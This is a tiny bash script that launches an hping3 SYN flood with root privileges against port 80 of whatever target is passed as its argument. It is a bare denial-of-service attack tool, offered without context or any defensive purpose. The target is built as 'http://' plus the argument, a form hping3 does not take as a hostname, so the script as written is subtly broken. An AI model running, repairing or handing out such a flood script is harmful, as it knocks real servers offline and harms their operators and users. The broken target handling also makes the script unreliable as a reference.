#!/bin/bash
sudo hping3 -S --flood -V -p 80 "http://$1"
